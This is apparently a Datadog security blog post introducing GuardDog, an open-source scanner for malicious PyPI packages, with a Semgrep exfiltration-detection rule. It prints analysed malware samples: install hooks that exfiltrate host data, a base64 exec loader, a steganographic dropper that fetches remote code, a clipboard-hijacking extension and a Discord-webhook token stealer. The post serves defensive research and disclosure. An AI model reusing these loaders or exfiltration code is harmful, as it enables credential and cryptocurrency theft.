@@ -1,0 +1,346 @@
+
+This blog post presents the internship project of Ellen Wang, who interned in the Datadog Security Research team.
+In recent months, the industry has seen an increase in attacks targeting the software supply chain – a term that encompasses tools, code, and infrastructure needed to deploy an application, often involving open source or third-party vendor components. One common way threat actors execute these attacks is by compromising or uploading malicious dependencies in open source software package repositories, including the Python Package Index (PyPI).
+Today, we’re excited to release GuardDog, a new open source project that helps identify malicious Python packages using Semgrep and package metadata analysis.
+Why detecting malicious PyPI packages is critical for supply chain security
+In software supply chain attacks, threat actors target various points in the build, packaging, and deployment process. As these attacks have grown in popularity, they’ve dramatically changed the landscape of application security.
+The Supply Chain Levels for Software Artifacts (SLSA) model describes the different attack vectors involved in supply chain attacks:
+
+
+Every step of the software development life cycle is susceptible to an attack, from the Linux hypocrite commits that threatened the Linux kernel source code, to the SolarWinds attack where actors compromised the build platform. Among these potential points of vulnerability, compromised dependencies are particularly attention-worthy because they offer an easily accessible route to the application, especially in the context of open source software.
+Because open source software packages are so widely used, they make enticing targets for attackers to compromise – and PyPI is no exception. Malicious PyPI packages have enabled malicious actors to access machines and production environments to steal sensitive data (ctx), download trojans (aws-login0tool), and perform cryptojacking (colourama). In the worst case, these packages can allow threat actors to gain access to a victim’s environment, as seen in CodeCov and SUNBURST incidents.
+Malicious PyPI packages in the wild
+To find common attack vectors in PyPI malware, we reverse-engineered several packages that had previously been taken down from PyPI. Then, we looked at what attack techniques they used. Here are some of the most common techniques we witnessed.
+Initial access: To gain access into a system, attackers frequently use typosquatting, a technique where a threat actor purposefully names a package to mimic a popular one. This tricks developers into installing the malicious package. Other techniques for gaining access include compromising a maintainer’s account or email domain.
+Execution: Once the package is installed, it typically either directly executes a malicious payload through exec or eval or downloads a second-stage executable. Malware often executes code at installation time by defining a malicious post-installation script, or inside an __init__.py file that’s automatically executed when the module is imported.
+Exfiltration: Malicious PyPI packages frequently exfiltrate system information and environment variables, such as AWS access keys, to a remote server. This is typically done through an HTTP request.
+Detect malicious PyPI packages with GuardDog
+Static analysis tools are typically used to identify vulnerabilities. GuardDog makes use of this same technique to identify malicious packages. Because GuardDog provides heuristics that identify common attacker techniques rather than package signatures, you can use it to identify malicious packages that have never been seen before.
+To detect malicious behavior, we use a set of heuristics designed to capture the patterns we observed. These heuristics within GuardDog scan for suspicious patterns from two locations: the source code and the package metadata on PyPI.
+Source code heuristics
+We developed GuardDog source code heuristics as Semgrep rules, a popular static analysis tool. Semgrep’s taint tracking feature, which analyzes how data flows through code, is especially useful in tracking data exfiltration and downloads of executable files. GuardDog currently ships with the following heuristics:
+
+Command overwrite: The install command is overwritten in the setup.py file, indicating that a system command is automatically run when installing the package through pip install.
+Dynamic execution of Base64-encoded data: Using Semgrep taint tracking mode, identifies when a Base64-encoded string ends up being executed by a function like exec or eval.
+Dynamic execution of code hidden inside an image: Detects when code hidden inside of an image (steganography) is extracted and executed.
+Download of an executable to disk: Identifies when data coming from an HTTP response (e.g., requests.get) is written to disk and dynamically executed, which typically corresponds to a dropper downloading a second-stage payload. This heuristic leverages taint tracking as well.
+Exfiltration of sensitive data: Detects when sensitive data ends up being sent over the network. We define sensitive data as commonly stolen environment variables and system information, such as the AWS_SECRET_ACCESS_KEY environment variable, the result of gethostname(), or reading from the .aws/credentials file.
+rules:
+- id: exfiltrate-sensitive-data
+  mode: taint
+  pattern-sources:
+    - pattern: socket.gethostname()
+    - patterns:
+      - pattern-either:
+          - pattern: os.getenv($ENVVAR)
+          - pattern: os.environ[$ENVVAR]
+      - metavariable-regex:
+          metavariable: $ENVVAR
+          regex: ([\"\'](AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY)[\"\'])
+  pattern-sinks:
+    - pattern-either:
+        - pattern-inside: requests.$METHOD(...)
+  message: Package exfiltrating sensitive data to a remote server
+  languages:
+    - python
+  severity: WARNING
+
+Suspicious domains: A number of malicious Python packages make HTTP requests to domains with suspicious extensions such as .xyz or .top, or URL shorteners like bit.ly. GuardDog flags requests to domains that follow these patterns.
+Package metadata heuristics
+In addition to analyzing the source code, GuardDog takes into account the package metadata and comes with several heuristics that track patterns resembling those commonly found in malicious packages.
+
+Typosquatting: Checks if the package name has a short Levenshtein distance with one of the top 5,000 packages, or two characters are swapped. For instance, it would flag packages named reuqests or PensorFlow.
+Potentially compromised maintainer email: Checks if the package maintainer’s email domain was re-registered after the latest package release. This can indicate an attacker taking over an expired domain, and using it to steal the maintainer’s account, which has been proven to be a large-scale issue on NPM.
+Missing package information: Flags packages that have no description at all, or have a release version of 0.0.0. Although this doesn’t necessarily indicate malicious behavior, it can be considered suspicious.
+Putting it all together in a CLI tool
+GuardDog wraps these commands in a convenient CLI. Let’s take a look at how you can use GuardDog  to scan PyPI packages. First, we need to install the package from the Github repository:
+pip install git+https://github.com/DataDog/guarddog.git
+To scan a package from the PyPI registry using GuardDog, simply specify the name of the package.
+# Scan the most recent version
+guarddog scan setuptools
+Additional options are available:
+# Scan a specific version of the 'requests' package
+guarddog scan requests --version 2.28.1
+
+# Scan the 'request' package using 2 specific heuristics
+guarddog scan requests --rules exec-base64 --rules code-execution
+
+# Scan the 'requests' package using all rules but one
+guarddog scan requests --exclude-rules exec-base64
+GuardDog can also scan local packages:
+# Scan a local package
+guarddog scan /tmp/triage.tar.gz
+GuardDog can also scan requirements.txt files. In this case, it will sequentially scan each dependency, taking into account version constraints.
+
+
+Malicious packages in the wild
+We leveraged GuardDog to identify several malicious packages in the wild. Here are a few highlights from our findings.
+beautifulsup4
+beautifulsup4 is a malicious package that masquerades as the legitimate beautifulsoup4 package (note the extra o in the real package name).
+
+
+This package targets Windows machines, where it installs a malicious browser extension that hijacks the user’s clipboard. When the user copies a cryptocurrency wallet address to their clipboard, the extension automatically overwrites it with the address of the attacker. The intent is to have the victim unknowingly initiate a cryptocurrency transfer to the attacker instead of the intended recipient.
+appDataPath = os.getenv('APPDATA')
+desktopPath = os.path.expanduser('~\Desktop')
+
+with open(appDataPath + '\\Extension\\background.js', 'w+') as extensionFile:
+  extensionFile.write('''var _0x327ff6=_0x11d4;<SNIP>.setInterval(check,0x3e8);''')
+
+with open(appDataPath + '\\Extension\\manifest.json', 'w+') as manifestFile:
+    manifestFile.write('{"name": "Windows","background": {"scripts": ["background.js"]},"version": "1","manifest_version": 2,"permissions": ["clipboardWrite", "clipboardRead"]}')
+
+paths = [
+  appDataPath + '\\Microsoft\\Windows\\Start Menu',
+  appDataPath + '\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar',
+  desktopPath
+]
+for path in paths:
+  for root_directory, sub_directories, files in os.walk(path):
+    for file in files:
+      if file.endswith('.lnk'):
+        shortcut = shell.CreateShortcut(root_directory + '\\' + file)
+        executable_name = os.path.basename(shortcut.TargetPath)
+
+        if executable_name in ['chrome.exe', 'msedge.exe', 'launcher.exe', 'brave.exe']:
+          shortcut.Arguments = '--load-extension={appDataPath}\\Extension'.format(appDataPath=appDataPath)
+          shortcut.Save()
+We identified several other packages with the same payload attempting to masquerade as popular packages:
+
+python-dateuti
+pyautogiu
+pygaem
+python3-flask
+python-flask
+djangoo
+urlllib
+bleurt
+bleurt overwrites the setup.py install command to run malicious code. In this case, it reads the machine hostname, current username, and working directory and sends this data to a remote server.
+
+
+class CustomInstall(install):
+    def run(self):
+        install.run(self)
+        hostname=socket.gethostname()
+        cwd = os.getcwd()
+        username = getpass.getuser()
+        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
+        requests.get("https://79788b091939873b8625001a35bcb283.m.pipedream.net",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
+
+
+setup(name='bleurt', #package name
+      version='1.0.0',
+      description='test',
+      author='test',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
+Although the behavior is not actively malicious, it’s definitely not something you’d want to install, and may be an attacker preparing an actual attack through a package update.
+xolokvhcqvifyf
+
+
+The xolokvhcqvifyf dynamically executes base64 encoded Python code in its __init__.py:
+import base64 as b; exec(b.b64decode('dHJ5OgogICAgX19QWU9fXzA...’))
+After several rounds of obfuscation, it ends up loading a malicious serialized Python payload using marshal.loads.
+By pivoting on the user having uploaded this package, we were able to identify a number of other malicious packages. These packages contain various malicious payloads, including:
+
+Cookie stealers for Roblox, that exfiltrates stolen data to a Discord Webhook
+webhookk='https://discord.com/api/webhooks/1023336326428377179/ZNOJPVYQsr0XLGJvED6i0EbgAps6iMeeJjzwskJxHYuWkLnDFLAIZKe7WJ12QFkHkoLY'
+
+Packages masquerading as popular packages, such as fast-httpx or newurllib
+Scripts that were heavily obfuscated using BlankOBF that end up dropping Bank-Grabber, a Python malware that can act as a trojan and stealer.
+Here is the full list below:
+aowdjpawojd
+bloxflipscraper
+bloxflipsearch
+darknegrobbc
+deflib
+fast-httpx
+fdsfsdfsdfgsdg
+habibisus
+hellomynameisahjahs
+hellowhatisao
+hugebbc
+kayauthgen
+keyauthkey
+newurllib
+oaijwdoijwaoj
+pussysus
+roblox-py1000
+robloxlogger
+robloxpinreader
+robloxpinreaderr
+robonotif
+settinginmaass
+tesoaoerm
+testingbrooasqa
+testinghelloma
+testingijijwdaijdwa
+testomadaoto
+type-a-own-package-name
+ulibasset
+updlibupload
+urllib3installer
+urllib3loader
+urllibdownloader
+urllibinstaller
+urllibloader
+wadokwaokda
+xoloaelvcsjwnt
+xoloaghvurilnh
+xoloaoqcjnreyc
+xoloarmmonwkmr
+xoloctwuaywkna
+xolocyawkmylds
+xolodqijhnjgte
+xolodxhrsnrxai
+xoloewndmzvlqe
+xolofucxlcmyke
+xologpbhyminnv
+xolohnetekcjdz
+xolokadyqehtbs
+xolokqhufyiwyq
+xolokvhcqvifyf
+xolomayflwnfmy
+xolomdabxhhrue
+xolommyjlqlhsw
+xolonjucebiwfa
+xolookvryqetgd
+xolopfydnuxyfh
+xolopwjaansvnd
+xoloqgavocbfcd
+xoloqvqexetcqo
+xolortpdcanegu
+xolosbmgfnvgzi
+xolostfqwqiaxe
+xolosybevwfsny
+xolotabiamysla
+xolotestomegone
+xolotxobrzatpu
+xolouwdmgbgkvr
+xolovzgfkdamoj
+xoloxrxcxfywtm
+xoloxygjidhpoo
+xoloyfczocogra
+xoloytubfihhsa
+xolozamdgbxywf
+xolozpnyeyhirx
+yohewoasaw
+colorsapi
+
+
+colorsapi uses steganography to hide malicious code inside of an image.
+# Attempts to import or install 'judyb', a steganography library
+try:
+    from judyb import lsb
+except:
+    os.system('pip install judyb')
+
+# Downloads the image containing the hidden malicious code
+r = requests.get('https://i.imgur.com/nE2yz0q.png')
+
+# Writes the image to disk
+with open(f'{os.getenv("APPDATA")}\\nE2yz0q.png', 'wb') as f:
+    f.write(r.content)
+
+# Extract and execute the hidden code
+exec(lsb.reveal(f'{os.getenv("APPDATA")}\\nE2yz0q.png'))
+The hidden code is:
+print('a');__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbS<snip>cw=="),'<string>','exec'))
+The Base64-encoded payload decodes to the following (slightly renamed for readibility purposes):
+from tempfile import NamedTemporaryFile
+from sys import executable
+from os import system
+
+tmp = NamedTemporaryFile(delete=False)
+tmp.write(b"""from urllib.request import urlopen; exec(urlopen('http://misogyny.wtf/inject/UsRjS959Rqm4sPG4').read())""")
+tmp.close()
+try:
+  system(f"start {executable.replace('.exe', 'w.exe')} {tmp.name}")
+except:
+  pass
+This code effectively retrieves a third-stage Python code from misogyny.wtf and dynamically executes it. At the time of analysis, this domain was inaccessible.
+sagetesteight
+
+
+sagetesteight overwrites the setup.py install command to download a malicious executable to Windows system locations such as AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\boot, causing it to run on boot. It downloads the malicious executable (main.exe) from https://github.com/dcsage/defonotagrabber.
+
+
+This executable is Python code packaged with PyInstaller. By decompiling it using pyinstxtractor and pycdc, we can see it acts as a stealer by stealing cookies of various browsers (Chrome, Firefox, Brave, Yandex, Opera) as well as Discord tokens, and exfiltrating them to a Discord Webhook.
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1040010700677988502/-NIIPOoDdImwivYH43PiNxcvlGho7Dt1lZg3IG7U4IZbvkq7eQj6d_5eYqyFDjVo88wB'
+
+paths = {
+  'Discord': roaming + '\\Discord',
+  # ...
+  'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default'
+} 
+message = '@everyone' if PING_ME else ''
+for platform, path in paths.items():
+  # ...
+  tokens = find_tokens(path)
+  if len(tokens) > 0:
+    for token in tokens:
+      message += f'''{token}\n'''
+
+headers = {
+  'Content-Type': 'application/json',
+  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11' 
+}
+payload = json.dumps({'content': message })
+
+try:
+  req = Request(WEBHOOK_URL, payload.encode(), headers, **('data', 'headers'))
+  urlopen(req)
+except:
+  # ...
+Similarly named packages indicate the author is likely still iterating on his malware:
+sagetesteight
+sagetestfive
+sagetestfour
+sagetestseven
+sagetestsix
+sagetestthree
+sagetesttwo
+What’s next
+In the future, we’ll add additional rules to GuardDog. We may also release further integrations that can run as GitHub Actions.
+Check out GuardDog here. We are also releasing the contents of 130+ malicious PyPI packages we identified with GuardDog to a GitHub repository.
+We welcome any contributions to the development of the project, and we can’t wait to hear from you!
+exec
+eval
+__init__.py
+install
+setup.py
+pip install
+exec
+eval
+requests.get
+AWS_SECRET_ACCESS_KEY
+gethostname()
+.aws/credentials
+.xyz
+.top
+bit.ly
+reuqests
+PensorFlow
+0.0.0
+requirements.txt
+beautifulsup4
+beautifulsoup4
+o
+python-dateuti
+pyautogiu
+pygaem
+python3-flask
+python-flask
+djangoo
+urlllib
+bleurt
+xolokvhcqvifyf
+__init__.py
+marshal.loads
+fast-httpx
+newurllib
+colorsapi
+misogyny.wtf
+sagetesteight
+AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\boot
+main.exe
